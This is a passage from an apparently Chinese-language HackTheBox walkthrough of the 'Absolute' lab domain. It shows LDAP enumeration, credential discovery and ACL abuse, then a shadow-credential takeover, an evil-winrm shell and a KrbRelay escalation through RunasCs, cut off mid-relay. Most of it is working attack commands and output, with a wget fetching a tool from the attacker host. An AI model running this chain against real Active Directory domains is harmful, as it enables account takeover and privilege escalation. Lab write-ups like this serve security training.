└─# crackmapexec ldap 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k --users                                                 130 ⨯
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.181    389    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl
LDAP        10.10.11.181    389    DC               [*] Total of records returned 20
LDAP        10.10.11.181    389    DC               Administrator                  Built-in account for administering the computer/domain
LDAP        10.10.11.181    389    DC               Guest                          Built-in account for guest access to the computer/domain
LDAP        10.10.11.181    389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.10.11.181    389    DC               J.Roberts
LDAP        10.10.11.181    389    DC               M.Chaffrey
LDAP        10.10.11.181    389    DC               D.Klay
LDAP        10.10.11.181    389    DC               s.osvald
LDAP        10.10.11.181    389    DC               j.robinson
LDAP        10.10.11.181    389    DC               n.smith
LDAP        10.10.11.181    389    DC               m.lovegod
LDAP        10.10.11.181    389    DC               l.moore
LDAP        10.10.11.181    389    DC               c.colt
LDAP        10.10.11.181    389    DC               s.johnson
LDAP        10.10.11.181    389    DC               d.lemm
LDAP        10.10.11.181    389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.10.11.181    389    DC               svc_audit
LDAP        10.10.11.181    389    DC               winrm_user                     Used to perform simple network tasks
```

它不仅找到了描述字段，而且还提供了描述字段(可能需要滚动到上面才能看到它)。svc_smb用户的描述“AbsoluteSMBService123!”看起来像个密码。

Crackmapexec确认了这一点:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb 10.10.11.181 -u svc_smb -p 'AbsoluteSMBService123!' -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!
```

#### 不使用CME
#### ldapsearch Errors

如果需要更详细地了解LDAP，使用ldapsearch。这里可能会出现一些错误。如果尝试使用creds来运行，它将返回AcceptSecurityContext:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# ldapsearch -H ldap://dc.absolute.htb -x -D d.klay@absolute.htb -w Darkmoonsky248girl -s base
ldap_bind: Invalid credentials (49)
        additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52f, v4563
```

这是因为该帐户受到限制(不是NTLM，只能用Kerberos)。

#### GET DATA

使用-Y GSSAPI指定Kerberos认证。最好使用apt安装libsasl2-modules-gssapi-mit包，以防止再次出现错误。

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "dc=absolute,dc=htb"                                                       49 ⨯
SASL/GSSAPI authentication started
SASL username: d.klay@ABSOLUTE.HTB
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base <dc=absolute,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# absolute.htb
...[snip]...
# svc_smb, Users, absolute.htb
dn: CN=svc_smb,CN=Users,DC=absolute,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc_smb
description: AbsoluteSMBService123!
distinguishedName: CN=svc_smb,CN=Users,DC=absolute,DC=htb
instanceType: 4
whenCreated: 20220609082551.0Z
whenChanged: 20230523003558.0Z
...[snip]...
```

密码可在svc_smb用户的description中找到。

#### Auth as m.lovegod
#### Enumeration
#### Bloodhound

标记svc_smb为owned:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute3.png)

但是它的权限和d.klay一样。

#### SMB

作为svc_smb用户，有几个共享的读权限:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb dc.absolute.htb -k -u svc_smb -p 'AbsoluteSMBService123!' --shares
SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!
SMB         dc.absolute.htb 445    DC               [+] Enumerated shares
SMB         dc.absolute.htb 445    DC               Share           Permissions     Remark
SMB         dc.absolute.htb 445    DC               -----           -----------     ------
SMB         dc.absolute.htb 445    DC               ADMIN$                          Remote Admin
SMB         dc.absolute.htb 445    DC               C$                              Default share
SMB         dc.absolute.htb 445    DC               IPC$            READ            Remote IPC
SMB         dc.absolute.htb 445    DC               NETLOGON        READ            Logon server share
SMB         dc.absolute.htb 445    DC               Shared          READ
SMB         dc.absolute.htb 445    DC               SYSVOL          READ            Logon server share
```

现在可以访问Shared了。使用smbclient.py:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# smbclient.py 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
Type help for list of commands
# use Shared
# ls
drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 .
drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 ..
-rw-rw-rw-         72  Thu Sep  1 13:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Thu Sep  1 13:02:23 2022 test.exe
```

把两个文件都下载下来

``` bash
# get compiler.sh
# get test.exe
```

sh只有一行，编译一个Nim程序。test.exe是Windows 64位的exe:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# cat compiler.sh
#!/bin/bash

nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# file test.exe
test.exe: PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows, 11 sections
```

#### 动态分析

到Windows机器上，尝试一下。什么也不会发生。与Wireshark一起运行，并注意到有一堆DNS查询:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute4.png)

更新hosts文件，使其包含_ldap._tcp.dc.absolute. 然后重新运行程序。在执行25-30秒后，会尝试在Absolute上正向连接到LDAP:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute5.png)

沿着这条数据流，看起来那里可能有密码凭证信息:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute6.png)

得到一样的AcceptSecurityContext错误，得到上面使用NTLM时。深入研究Wireshark中的bindRequest(1)包，存在mlovegod的密码:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute7.png)

#### 验证密码

确认密码对m.lovegod用户有效

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb 10.10.11.181 -u m.lovegod -p 'AbsoluteLDAP2022!' -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
```

#### Shell as winrm_user
#### Bloodhound

m.lovegod拥有Network Audit组，该组在winrm_user用户上有GenericWrite权限。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute8.png)

m.lovegod是三个groups的成员，但不是Network Audit:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute9.png)

winrm_user是远程管理用户的成员，这意味着他们可以远程连接到WinRM并获得一个shell:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute10.png)

#### 攻击策略

为了获得winrm_user的权限，首先需要在Network Audit组上赋予m.lovegod写权限。然后就可以把m.lovegod加到组里了。最后，使用这些权限为winrm_user帐户创建一个shadow credential

在Windows上执行前两步要容易得多(Bloodhound会展示要运行的命令)。本文会同时展示Windows和Linux环境下的利用方法

"shadow credential"技术涉及操纵用户的msDS-KeyCredentialLink属性，该属性将密码凭证绑定到他们的帐户，然后就可以使用该密码凭证进行身份验证。这种技术比更改用户密码的破坏性要小得多。详情参考[Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)


#### 将m.lovegod添加到Network Audit组
#### windows

Bloodhound提供了利用方法:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute11.png)

为了使这种攻击有效，必须将Absolute的IP配置为VPN接口的DNS服务器的ip地址:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute12.png)

然后在powershell中导入[PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)，然后创建一个密码凭证

``` bash
PS > $pass = ConvertTo-SecureString 'AbsoluteLDAP2022!' -AsPlainText -Force
PS > $cred = New-Object System.Management.Automation.PSCredential('absolute\m.lovegod', $pass)
```

如果我尝试像上面那样运行命令，它会说-PrincipleIdentity选项是必需的。查看[Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/)文档，添加-DomainController选项。

``` bash
PS > Add-DomainObjectAcl -Credential $cred -TargetIdentity "Network Audit" -Rights All -PrincipalIdentity m.lovegod -DomainController dc.absolute.htb
```

现在要将m.lovegod添加到组中，使用另一个PowerView commandlet Add-DomainGroupMember:

``` bash
PS > Add-DomainGroupMember -Credential $cred -Identity "Network Audit" -member m.lovegod -Domain "absolute.htb"
```

成功了

``` bash
PS > Get-DomainGroupMember -Credential $cred -Identity "Network Audit" -Domain "absolute.htb" -DomainController "dc.absolute.htb" | fl MemberName

MemberName : svc_audit
MemberName : m.lovegod
```

靶场机器上有一个脚本定期恢复这些成员关系，所以如果一个失败，玩家需要从头开始重新操作启用访问权限。

#### linux

首先获取m.lovegod用户的TGT

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# getTGT.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -dc-ip dc.absolute.htb
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] Saving ticket in m.lovegod.ccache

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# export KRB5CCNAME=m.lovegod.ccache
```

要将用户添加到NETWORK AUDIT组中，可以首先将用户m.lovegod设置为组的所有者。为了修改一个组的所有者，可以使用[[owneredit.py] New example script to change an object's owner #1323](https://github.com/fortra/impacket/pull/1323/files)，这是Impacket套件的一个拉取请求里的脚本。

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# python3 owneredit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] Current owner information below
[*] - SID: S-1-5-21-4078382237-1492182817-2568127209-1109
[*] - sAMAccountName: m.lovegod
[*] - distinguishedName: CN=m.lovegod,CN=Users,DC=absolute,DC=htb
[*] OwnerSid modified successfully!
```

现在已经成功修改了组的所有者。现在可以使用[[dacledit] New example script for DACL manipulation #1291](https://github.com/fortra/impacket/pull/1291)，Impacket另一个拉取请求里的脚本，它将Network Audit组的完全控制权交给用户m.lovegod。

在[[dacledit] New example script for DACL manipulation #1291](https://github.com/fortra/impacket/pull/1291)中，有一个整洁的Impacket脚本尚未合并。它提供了一个名为dacledit.py的示例脚本，该脚本执行与Add-DomainObject Acl相同的操作。

克隆这个[impacket/tree/dacledit](https://github.com/ShutdownRepo/impacket/tree/dacledit)，签出dacledit分支，然后安装:

``` bash
git clone https://github.com/ShutdownRepo/impacket.git impacket-dacl
cd impacket-dacl
python -m pip install .
```

现在就可以从任何地方运行dacledit.py脚本了

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# dacledit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights FullControl
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230530-125613.bak
[*] DACL modified successfully!
```

上述脚本给m.lovegod添加完全控制权限。

然后将用户添加到Network Audit组中，使用net(apt install samba)。最可靠的使用方法是使用--use-kerberos=required，不过由于某些原因，每次运行时都要求输入密码。但仍然有用，因为m.lovegod不在group中

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# rm /tmp/krb5cc_0

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# kinit m.lovegod
Password for m.lovegod@ABSOLUTE.HTB:

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
absolute\m.lovegod
absolute\svc_audit
```

或者，使用-k选项，会使用之前kinit生成的ticket。必须经常删除该票据并重新初始化它，否则会报错:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' -k -S dc.absolute.htb
WARNING: The option -k|--kerberos is deprecated!

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# net rpc group members "Network Audit" -U 'm.lovegod' -k -S dc.absolute.htb
WARNING: The option -k|--kerberos is deprecated!
absolute\m.lovegod
absolute\svc_audit
```

#### Shadow Credential

在Outdated机器中，展示了[如何使用Whisker](https://0xdf.gitlab.io/2022/12/10/htb-outdated.html#get-sflowers-ntlm)和[使用PyWhisker远程操作](https://0xdf.gitlab.io/2022/12/10/htb-outdated.html#beyond-root---skipped-steps)。但是Certipy将这几个步骤打包成一个命令，所以更方便。使用pip install certipy-ad安装。

certipy find将返回关于域以及Active Directory证书服务(ADCS)如何配置的各种信息。

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# certipy find -username m.lovegod@absolute.htb -k -target dc.absolute.htb
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'absolute-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'absolute-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'absolute-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'absolute-DC-CA'
[*] Saved BloodHound data to '20230530133316_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230530133316_Certipy.txt'
[*] Saved JSON output to '20230530133316_Certipy.json'
```

系统上确认安装了ADCS。因为已经安装了ADCS，也有了GenericWrite权限，所以现在可以覆写winrm_user用户的msDS-KeyCredentialLink属性，来进行shadow credential攻击。

m.lovegod用户添加到Network Audit组后需要重新生成TGT

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# getTGT.py absolute.htb/m.lovegod:AbsoluteLDAP2022! -dc-ip dc.absolute.htb
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] Saving ticket in m.lovegod.ccache

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# export KRB5CCNAME=m.lovegod.ccache
```

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb -account winrm_user
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '56abaff7-ff87-070d-beac-48aa003f33a9'
[*] Adding Key Credential with device ID '56abaff7-ff87-070d-beac-48aa003f33a9' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID '56abaff7-ff87-070d-beac-48aa003f33a9' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Using principal: winrm_user@absolute.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```

#### shell

现在将这个ticket导入KRB5CCNAME环境变量，然后使用evil-winrm，最终拿下user权限的shell。

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb
zsh: /usr/local/bin/evil-winrm: bad interpreter: /usr/bin/ruby3.0: no such file or directory

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
absolute\winrm_user
*Evil-WinRM* PS C:\Users\winrm_user\Documents> cat C:\Users\winrm_user\Desktop\user.txt
8c2b53e8d19301ef6f6a211cbb2791af
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute13.png)

#### Shell as root
#### KrbRelay背景知识

在过去几年中，KrbRelay是一种非常流行的基于kerberos的攻击手法。该技术最初是在2021年10月的Google Project Zero帖子中讨论的[Using Kerberos for Authentication Relay Attacks](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)，然后Cube0x0在2022年2月发布了一个[公开的KrbRelay POC](https://github.com/cube0x0/KrbRelay)。2022年4月，[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)将KrbRelay中最常见的攻击手法全都自动化了

其思想是通过服务器将身份验证请求中继回DC服务器，以便对攻击者进行恶意身份验证。

在这个漏洞被称为"不会被修复"整整一年之后，微软改变了立场，并在2022年10月打了补丁。

 - [This MS patch also effects krbrelay. It looks like we had our fun with rpc->ldap](https://twitter.com/cube0x0/status/1583568590393204736?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1583568590393204736%7Ctwgr%5Ef5e73cb9e063d7389d041cca04dd3113113f71a4%7Ctwcon%5Es1_&ref_url=https%3A%2F%2F0xdf.gitlab.io%2F2023%2F05%2F27%2Fhtb-absolute.html)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute14.png)

要想攻击成功，目标必须:

 - 没有2022年10月的补丁
 - LDAP签名必须禁用(这是Windows的默认设置)

理论上，crackmapexec能够检查LDAP签名，但是在实际操作的时候，报了错误，导致在这里失败:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec ldap 10.10.11.181 -u m.lovegod -p 'AbsoluteLDAP2022!' -M ldap-checker -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.181    389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
LDAP-CHE... 10.10.11.181    389    DC               [-] [!!!] invalid credentials - aborting to prevent unnecessary authentication


[*] Shutting down, please wait..
```

没有很好的方法来检查是否启用了LDAP签名。考虑到禁用是Windows的默认设置，并且该box是在2021年9月发布的(在补丁发布之前)。

#### KrbRelay
#### 编译

把[KrbRelay](https://github.com/cube0x0/KrbRelay)克隆到本地Windows主机上，并在Visual Studio中打开.sln文件。去Built > Batch Build以获得如下对话框:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute15.png)

为Build选择上图两个版本配置，并单击Build。成功生成两个二进制文件.exe:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute16.png)

把这两个二进制文件复制回kali Linux攻击机，并将它们上传到Absolute。

``` bash
*Evil-WinRM* PS C:\programdata> upload KrbRelay.exe KrbRelay1.exe

Info: Uploading /root/hackthebox/machine/absolute/KrbRelay.exe to C:\programdata\KrbRelay1.exe

Data: 2158592 bytes of 2158592 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> wget 10.10.16.54/CheckPort.exe -outfile CheckPort.exe
```

#### Find Port

CheckPort.exe将识别恶意服务器将运行的端口:

``` bash
*Evil-WinRM* PS C:\programdata> .\CheckPort.exe
[*] Looking for available ports..
[*] SYSTEM Is allowed through port 10
```

识别到端口10

#### 识别CLSID

与许多potato攻击的工作原理相似，需要一个具有正确权限的有效RPC服务的CLSID。一些工具可以在目标主机上发现这些，但是从默认工具中进行选择通常更容易、更快捷。

此主机运行的是Windows 10.0.17763.3406:

``` bash
*Evil-WinRM* PS C:\programdata> cmd /c ver

Microsoft Windows [Version 10.0.17763.3406]
```

这[Windows Version Numbers](https://www.gaijin.at/en/infos/windows-version-numbers)到服务器2019或Windows 10。[KrbRelay README](https://github.com/cube0x0/KrbRelay#clsids)上有一个操作系统默认clsid列表。

找到一个CLSID来指定KrbRelay将要运行的服务。clsid各不相同，通常可以使用默认的，比如TrustedInstaller的CLSID。

``` bash
8F5DF053-3013-4dd8-B5F4-88214E81C0CF
```

#### 失败

现在使用README.Md中的语法运行这个程序，但是失败了:

``` bash
*Evil-WinRM* PS C:\programdata> .\KrbRelay1.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10
[*] Relaying context: absolute.htb\DC$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\programdata\KrbRelay1.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAACYTYU7Kuv1TQ/AQ/VJ6GyBAlAAAAgU//+7x9HghbuU1iIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 8f5df053-3013-4dd8-b5f4-88214e81c0cf
System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
   at KrbRelay.Ole32.CoGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsid, Object pUnkOuter, CLSCTX dwClsCtx, IStorage pstg, UInt32 cmq, MULTI_QI[] rgmqResults)
   at KrbRelay.Program.Main(String[] args)
```

此失败是由于该漏洞利用需要交互式会话，例如console。在这些会话中，密码凭据存储在内存中，因此可以被攻击者利用，这与现在使用的WinRM远程处理不同。

#### RunAsCs

[RunAsCs](https://github.com/antonioCoco/RunasCs)允许以不同用户的身份运行，注意此处使用的是最新版本的RunasCs version 1.5。

RunasCs是一个实用程序，用于运行具有与用户当前登录不同权限的特定进程，使用明文密码。

[Administrative tools and logon types](https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types)有一个logon type表。Runas/Network是logon type 9的示例。

目前，RunasCs支持多种[logon types](https://cybersafe.co.il/wp-content/uploads/2021/11/LOGON-types-compressed_compressed.pdf)，但最重要的是2、3和9。

 - Logon type 2: 就像box上的console。不幸的是，这种登录类型不能被DC上的每个人使用，因为它的先决条件是用户需要"交互式登录"权限，而域控制器上默认不授予这种权限。

 - Logon type 3: 用户帐户控制(UAC)绕过，它还需要密码，并且基本上是网络交互式登录，因为它也需要"交互式登录"特权。

 - Logon type 9: 这种登录类型与运行runas /netonly相同，这意味着不会检查密码，使用提供的密码在网络上进行身份验证。

在这一点上，Logon type 9似乎是最好的选择，因为通过网络作为另一个用户进行身份验证，可以使用任何密码，同时以自己的身份在本地运行应用程序。从repository的release部分获取最新的可执行文件，使用evil-winrm将其上传到机器，并使用qwinsta命令测试。

``` bash
*Evil-WinRM* PS C:\programdata> .\runascs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 "qwinsta"

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console                                     1  Conn
```

这次得到了一些输出，所以似乎是有希望的。然后通过RunasCs重新运行KrbRelay。

``` bash
*Evil-WinRM* PS C:\programdata> .\runascs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 ".\KrbRelay1.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10"

[*] Relaying context: absolute.htb\DC$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\programdata\KrbRelay1.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAAB9vU64ftMuuYvY9fnAPSf9AogAABwX//+5tG+e1GpphiIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 8f5df053-3013-4dd8-b5f4-88214e81c0cf
[*] apReq: 608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64632e6162736f6c7574652e687462a382049c30820498a003020112a103020104a282048a04820486bf6166466d1481cd39da3d867fe96ef4450d9f73d25c91cedeb5d24898544528958527ac2511aed99a0c525d162988b0d76d9326063e763997c4fa648e3c12b951e09cf70631df45fe5628becfe57a81353cfc7e159950930fd1fd3ecb90447bd94e26659d7cfc440fa54c1dacb97cebf08b294f49ae15de3171a235262160b832623510bc259f325c2f9dcb15065aacf93528a7679609fcd2f964bb95eb41c807a857143df058095d867fb6768e89078ee865e8e1f22733e59f8290066c1f2302dadaa40b42b7fb05113c7fa0f60be74e1099b659c898446595f7c2237a85b53c00a4833462b470401686944f1952a2a229ec42ab0d1c0da09dad76bd41fc86be012aeab49eac7d278b90ad588f86c3bb8dbccfebd821428019ce1fe9dd47987fad4c5d21c565b85d3bbd3979b68f9de13a02bcb388de58711e8594e502aabfcb4f491796f57d0834fc4ef7f62af3cfde0e76e41337e3fdc21e23b54aec7d61772e6d284bda2746bc7257d5e01d3aa7a89db4bf8ddb1929d06d09942da6138fb27695de110d14e996dc2726355c15dc5f86980128c7127c3271700429eb60619b04cf25d0b5d066bda88441240b73d3e1641675ad3c0946cb3fe14a7abeb3da5cd843285a29a3815148ad6a4f00e04f9b98e1ec228fc556d8748bd7be73b1f941ed5a5091b41d92140454129f8b4b2d161ba42368787234db1f05e3ce7c998c569e5848fed11656f79e2be2b7db9d21dcbc3bd88cdc5b26fee5c35c584e46c460d58c387671a0cfcd806bcc02cd08db4f8e4a5a8c80ba228f635da1375f3add1f42c9920fe358df3270edcc04eff080a7b84f6ffe1e42c5f91ca6e3ce49bfe891a022aa4c84f2678c000ebcb11419151234dcbb75fb900c76cda5d5b492f149cc40c1cf2cb3bed4ade7b4e89186c2e7c59c4f1e30f7d3c46cebb29a5b9ebb6495ccbbd5898797a312c6591089cbe5295fd714db7f471b59d265bc0be53da6e42f3be901f69e301ffede4f72783f82cb9fe8ef5b4c1806c4c7403d50f01a2d37ae3fec007795c831201d69d53eb4aad664d582eca06b5500d2b8d998b3d767d6be5e0599cb4cec23dad7db51502dc3a9e1aa2efbc51bac2c4ebfd987bfeae0b0b0b0a80f6f01341005ef8ecbb9f3884e6d30afccc5d83f5b6b6fe022ce981412083b0889fbc27a24b6a3ec02f95b9ab23b73ef45782d9efb5ff063212b0d4bae570086103d49dac6e7e88f58632b97609bec38da8889a5ff4d62df743a18669eb76c2fa6e0415de817fac150a67e7eb49565d1b9208e72bd48f66c2ab962cb2401c644a532ecb55f95cf654e1532badebacf9d931b4316e322d98aa5e14d6584426c3af566bc8388ad35b4288a6dea1288ef8ed2927556204101b319293fb1ae9af1e247fc1a49f42b2dd207516d7592e43461a507608a8574008e828a33f73473bff3e6e540a63889cd3965ae3768f50cccff7fb39123d03481d2d652ddf61b044026b47f6aa5db1d5b86ef085266c4536cc966c7e3b8fbab1194fc71ff6b58c73b02f4eb2de80f16aabad61ce5dbebeb49229aaa4c1f2ddceb4042a10b6ad93ad571e2250f0140f691115091b895bdc8570a1833f1715d1c866d85cf5991ff237bbeebdf14a48201a33082019fa003020112a28201960482019234d2ed6371d4542e90e94f50599925aa66fe3bdd62c9df8a29036b441e160c1c39b9505015032f54a3b4d1e7c4fb304cadd3d5fca7263a0ce21b95fd26009e83648e668fcb02e22a3b78cb2914f9cd72182b80228e6b59f0f91fdb293b5e4c470bcad47003a1df14a135e6d9f218537482bd4b57793efad6f481c982cea153f0c1479ce18bce67c1ae962502e1a9e027b7f2468180bcf6ab64f90345a485b7cfb42d37bf6fa390b0c222c9e4dc404b78bfc5a6768f09f8a91e88e47e342714e623fb05b06799ac0de148136c963814b0b62223d880803a85449a315b0e2500da31c3969c2b0875873e4cd271810e0f36e62996e587504619148df7ffd06f9c0834abf4f8912a31508bd17ed7c162a727a58c481353727db83268490b05d0ae46aabfeff777b0637254ad4e891d93c1a3a42bb07448704bf9f04657d7b4d01e2fe42f74ba6867827b447a7855aa52a17c18c5627ec258ea8bca3e504a987f17b4fb46e992135c2d3709e137b837927f7df3256dc17d6a2de947a965620f482579010e88b9b1db72883c3372812ca62780d7ff
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
